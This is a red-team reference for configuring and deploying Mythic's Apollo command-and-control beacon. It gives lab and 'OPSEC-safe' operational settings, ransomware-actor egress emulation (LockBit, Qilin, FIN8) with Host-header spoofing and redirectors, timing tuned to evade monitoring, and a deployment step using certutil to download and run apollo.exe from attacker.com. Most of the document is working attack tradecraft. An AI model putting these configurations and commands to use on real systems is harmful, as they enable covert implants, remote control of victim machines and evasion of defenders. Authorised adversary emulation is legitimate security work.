# Apollo Payload Configuration Reference

## ⚠️ CRITICAL - DO NOT USE FAKE DOMAINS

Example.com and 10.23.20.10:82 are **DETECTABLE**.

---

## Lab Testing Configuration

**Use when:** Training, CTF, non-monitored environments

```
Payload Type:           apollo
C2 Profile:             httpx
Filename:               apollo.exe
Selected OS:            Windows

PARAMETERS:
  callback_domains:           http://10.23.20.10:82
  callback_interval:          62
  callback_jitter:            37
  domain_rotation:            fail-over
  failover_threshold:         5
  encrypted_exchange_check:   true
  killdate:                   2027-11-30
  raw_c2_config:              generic_cdn_beacon.lab.toml   # LAB-ONLY, not actor coverage
  timeout:                    240
```

**Status:** Works for lab/testing only - obvious to monitoring

---

## Operational Configuration (OPSEC-Safe)

**Use when:** Red team operations, monitored environments

```
Payload Type:           apollo
C2 Profile:             httpx
Filename:               apollo.exe
Selected OS:            Windows

PARAMETERS:
  callback_domains:           https://<REDIR_FQDN>:443   # your redirector, real LE cert
  callback_interval:          62                          # LockBit ICBC cadence
  callback_jitter:            37
  domain_rotation:            fail-over
  failover_threshold:         5
  encrypted_exchange_check:   true
  killdate:                   2027-08-25
  raw_c2_config:              ../profiles/lockbit-icbc.httpx.toml   # actor profile, not generic
  timeout:                    240
```

**Status:** Actor-attributed (LockBit) beacon behind a real-cert redirector.

> You do **not** call back to jsDelivr/unpkg/cdnjs. You cannot C2 *through* a real CDN by pointing
> at it — that just talks to the CDN. It only "works" via **domain fronting**, which is **dead** on
> Cloudflare/CloudFront/Google/Azure Front Door/Fastly (blocked 2015-2024). And none of the modeled
> actors front through jsDelivr. Use actor-accurate egress (below).

---

## Valid Callback Domains — actor-accurate egress (F6)

Point the callback at **your redirector on 443** (real LE cert), then shape egress to match the
modeled actor. Do **not** set the callback to a real CDN, and do **not** rely on domain fronting.

### Per-actor egress shape

```
LockBit (ICBC)   https://<aged-registered-redirector>:443   fail-over across 2-3 aged, benign-
                                                             sounding REGISTERED domains (e.g.
                                                             cdn-metrics-style names you own).
                                                             NOT fronting. Host spoof is in the
                                                             profile (user.compdatasystems.com).

Qilin            https://<your-vps>:443                      forged Host: ocsp.verisign.com in the
                                                             profile; lands on the actor's own VPS,
                                                             NOT a real CA responder.

FIN8 (Sardonic)  A-B-C-D.sslip.io  ->  A.B.C.D               sslip.io wildcard maps the hostname to
                                                             an attacker IP with no domain to
                                                             register; 3-server priority fallback,
                                                             ~50-min wait if 443 is closed.
                                                             (Note: FIN8 is a NON-TLS binary
                                                             protocol -- httpx cannot represent it;
                                                             this is the Track-2 build, task F1.)
```

### Why not a real CDN / domain fronting
```
Domain fronting is DEAD on the majors:
  Cloudflare (2015), CloudFront + Google (2018), Azure Front Door (Jan 2024), Fastly (Feb 2024).
A 2024 study found 22/30 CDNs still block it -- fronting is now a "find a permissive CDN" game,
not a default. None of the modeled actors front through jsDelivr/unpkg/cdnjs. Pointing
callback_domains at a real CDN just talks to that CDN.
```

---

## WRONG Configurations (DO NOT USE)

### ❌ Fake Domains
```
https://example.com:443            WRONG - Not a real domain
https://cdn.examplestatic.io:443   WRONG - Spoofed domain
https://fake-cdn.com:443           WRONG - Obvious fake
```

### ❌ Non-Standard Ports
```
http://10.23.20.10:82              WRONG - Port 82 is anomalous
http://10.23.20.10:8080            WRONG - Obvious internal IP
http://localhost:8888              WRONG - Local port
```

### ❌ Aggressive Timing
```
callback_interval: 10              WRONG - Too fast (bot-like)
callback_interval: 5               WRONG - Extremely aggressive
callback_jitter: 10%               WRONG - Too predictable
callback_jitter: 0%                WRONG - Completely predictable
```

---

## Configuration Comparison

| Parameter | Lab | Operations | Why |
|-----------|-----|------------|-----|
| Domain | 10.23.20.10 (raw IP) | `<REDIR_FQDN>` redirector | Real-cert redirector normalises TLS (N6); NOT a real CDN |
| Port | 82 | 443 | Standard HTTPS port |
| Interval | 62s | 60s | Reasonable timing |
| Jitter | 37% | 50% | Less predictable (30-90s) |
| Transforms | Base64 | XOR+Base64url | Harder to detect |
| Profile | config_fixed.toml | config_hardened.toml | Enhanced headers/URIs |

---

## Deployment Steps

### 1. Generate Payload
- Use **Operational Configuration** above
- For actor coverage, select the **actor profile** (`../profiles/lockbit-icbc.httpx.toml` or
  `qilin-ocsp.httpx.toml`) for raw_c2_config; for generic hygiene testing use
  `generic_cdn_beacon.ops.toml` (not actor coverage)
- Use **real domain** (not example.com or 10.23.20.10)
- Set **killdate** to operation end date

### 2. Deploy to Target
```bash
certutil -urlcache -f http://attacker.com/apollo.exe %temp%\apollo.exe
%temp%\apollo.exe
```

### 3. Verify Callback
- Appears in Mythic UI within 60±30 seconds (60s ± 50% jitter)
- Check: User, hostname, IPs, OS, architecture

### 4. Queue Tasks
- Shell whoami → executes within one checkin cycle
- Output visible in Mythic UI

---

## OPSEC Validation Checklist

Before deployment, verify:

- [ ] Domain is **real** (not example.com)
- [ ] Port is **443** (not 82)
- [ ] Interval is **60+ seconds** (not 10s)
- [ ] Jitter is **50%+** (not 23%)
- [ ] Using an **actor profile** (`../profiles/lockbit-icbc.httpx.toml` / `qilin-ocsp.httpx.toml`)
      as raw_c2_config for actor coverage — or `generic_cdn_beacon.ops.toml` for non-attributed
      hygiene testing
- [ ] EKE encryption is **enabled**
- [ ] Kill date is **set** (operation end date)
- [ ] Raw C2 config **uploads without errors**
- [ ] Callback appears in Mythic within timing window
- [ ] Tasks execute successfully

---

## Troubleshooting

### "Config Check failed - Missing name"
→ Use a TOML profile (`generic_cdn_beacon.ops.toml` or an actor profile), not JSON

### "Failed to read file from Mythic (404)"
→ Restart httpx container and try again

### Callback never appears
→ Check:
  1. Domain is accessible from target
  2. Port 443 is open
  3. Interval/jitter window passed
  4. apollo.exe is running

### Tasks stuck at processing
→ Rebuild payload with latest Apollo.cs fix

---

## Real-World Example

**Operation:** Secure assessment for ACME Corp  
**Duration:** 2026-08-01 to 2026-08-15

**Configuration:**
```
callback_domains:    https://<REDIR_FQDN>:443     # your redirector, real LE cert
callback_interval:   62                           # LockBit ICBC documented cadence
callback_jitter:     37
killdate:            2026-08-15
raw_c2_config:       ../profiles/lockbit-icbc.httpx.toml   # actor profile
encrypted_exchange:  true
```

**Why this is the actor-attributed shape:**
- ✓ Redirector on 443 with a real LE cert normalises JA3S/JARM to a mainstream nginx stack (N6)
- ✓ 62s / 37% is LockBit's **documented** cadence — emulate the actor, don't invent a "polling" number
- ✓ Kill date prevents stray callbacks post-operation
- ✓ LockBit profile carries the real Host spoof + base64x2 + 814-byte-strip transform

**Accepted gap (F3):** the LockBit **JA3 `a0e9f5d64349fb13191bc781f81f42e1`** is NOT reproduced —
Apollo is .NET/SChannel. And note N1 (JA4H vs UA) still fires regardless. Do not claim CDN "blend";
that was the discredited jsDelivr/unpkg framing.

---

**Last Updated:** 2026-08-25  
**Status:** Production Ready  
**Author:** Red Team Assessment
